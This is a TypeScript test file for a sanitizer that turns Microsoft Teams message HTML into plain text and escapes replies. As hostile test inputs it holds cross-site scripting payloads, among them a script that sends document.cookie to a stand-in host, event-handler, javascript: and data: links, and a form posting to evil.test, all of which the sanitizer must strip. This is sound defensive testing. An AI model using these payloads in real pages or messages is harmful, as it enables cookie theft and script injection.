import { describe, expect, it } from 'vitest';
import { teamsHtml, teamsText } from './html';

// Teams message bodies arrive as HTML. Commander keeps them as plain text with light structure
// (paragraphs, lists, links, @mentions), never as markup: Chat text is untrusted Source content.
// Replies go the other way: the User's plain text, escaped, never markup.

describe('a reply’s text as the HTML Teams takes', () => {
  it('escapes everything that means something in HTML, and keeps line breaks', () => {
    expect(teamsHtml('Fish & <b>chips</b>\r\n"Tonight"\nit\'s <script>x</script>')).toBe(
      'Fish &amp; &lt;b&gt;chips&lt;/b&gt;<br>&quot;Tonight&quot;<br>it&#39;s &lt;script&gt;x&lt;/script&gt;',
    );
  });

  it('reads back as the same text (spacing at the ends of lines aside)', () => {
    expect(teamsText(teamsHtml('Line one & <two>\n  "three"'))).toBe('Line one & <two>\n"three"');
  });
});

describe('converting Teams HTML to plain text', () => {
  it('keeps paragraphs and line breaks, and decodes entities', () => {
    expect(
      teamsText('<p>Morning all &amp; welcome</p><p>Line one<br>Line two</p><div>Fish &lt;3 chips</div>'),
    ).toBe('Morning all & welcome\n\nLine one\nLine two\n\nFish <3 chips');
  });

  it('shows @mentions as @Name', () => {
    expect(teamsText('<p><at id="0">Priya Patel</at> can you look at this?</p>')).toBe(
      '@Priya Patel can you look at this?',
    );
  });

  it('keeps links, with the address when the text is something else', () => {
    expect(
      teamsText(
        '<p>See <a href="https://contoso.test/spec" title="spec">the spec</a> and <a href="https://contoso.test/">https://contoso.test/</a></p>',
      ),
    ).toBe('See the spec (https://contoso.test/spec) and https://contoso.test/');
  });

  it('keeps bulleted and numbered lists', () => {
    expect(
      teamsText(
        '<p>Today:</p><ul><li>Ship the fix</li><li>Write it up</li></ul><ol><li>First</li><li>Second</li></ol>',
      ),
    ).toBe('Today:\n\n- Ship the fix\n- Write it up\n\n1. First\n2. Second');
  });

  it('shows inline images as [image]', () => {
    expect(
      teamsText(
        '<p>Look<img src="https://graph.microsoft.com/v1.0/chats/19:x/messages/1/hostedContents/aaa/$value" alt="image" itemtype="http://schema.skype.com/AMSImage"></p>',
      ),
    ).toBe('Look [image]');
  });

  it('drops scripts, styles and hidden markup, and never keeps a tag', () => {
    const text = teamsText(
      '<style>p { color: red }</style><p onclick="steal()">Hi<script>alert("x")</script> there</p><attachment id="1700000000000"></attachment><iframe src="https://evil.test"></iframe>',
    );
    expect(text).toBe('Hi there');
    expect(text).not.toMatch(/[<>]/);
  });

  it('shows emoji by their alt text and collapses runs of whitespace', () => {
    expect(
      teamsText('<p>Nice   work\n  <emoji id="1f44d_thumbsup" alt="👍" title="Thumbs up"></emoji></p>'),
    ).toBe('Nice work 👍');
  });

  it('decodes numeric entities and non-breaking spaces', () => {
    expect(teamsText('<p>Caf&#233;&nbsp;at&#x20;noon</p>')).toBe('Café at noon');
  });

  // Hostile markup a Chat message might carry: none of it survives as markup, no address it would
  // load or run is kept, and only web and mail links keep their address.
  it.each([
    ['a script', '<p>Hi</p><script>fetch("https://evil.test/?c="+document.cookie)</script>', 'Hi'],
    // Not a script to Commander: its words stay, as words.
    ['a script split across tags', '<p>Hi<scr<script>x()</script>ipt>y()</p>', 'Hix()ipt>y()'],
    [
      'an event handler',
      '<p onmouseover="steal()">Hover</p><img src=x onerror="steal()">',
      'Hover\n\n[image]',
    ],
    ['an SVG with onload', '<svg onload="steal()"><circle r="5"/><script>x()</script></svg>Shape', 'Shape'],
    ['a remote image', '<img src="https://evil.test/pixel.png?u=sam">', '[image]'],
    [
      'a srcset image',
      '<picture><source srcset="https://evil.test/a.png"><img src="b.png"></picture>',
      '[image]',
    ],
    ['a javascript: link', '<a href="javascript:alert(1)">Click me</a>', 'Click me'],
    ['an encoded javascript: link', '<a href="&#106;avascript:alert(1)">Click</a>', 'Click'],
    ['a data: link', '<a href="data:text/html,<script>x()</script>">Open</a>', 'Open'],
    ['a CSS import', '<style>@import url("https://evil.test/a.css")</style><p>Styled</p>', 'Styled'],
    ['an inline style', '<div style="background:url(https://evil.test/b.png)">Box</div>', 'Box'],
    ['a frame', '<iframe src="https://evil.test"></iframe><object data="x.swf"></object>Framed', 'Framed'],
    ['a form', '<form action="https://evil.test"><input value="secret"><button>Go</button></form>', 'Go'],
    ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">Moved', 'Moved'],
  ])('drops %s', (_name, html, text) => {
    const out = teamsText(html);
    expect(out).toBe(text);
    expect(out).not.toMatch(/evil\.test|javascript:|data:/i);
  });

  it('keeps entity-escaped markup as the literal text it is', () => {
    expect(teamsText('<p>&lt;img src=x onerror=alert(1)&gt;</p>')).toBe('<img src=x onerror=alert(1)>');
  });

  it('keeps plain text bodies as they are, trimmed', () => {
    expect(teamsText('  plain <b>text</b>  ', 'text')).toBe('plain <b>text</b>');
  });
});
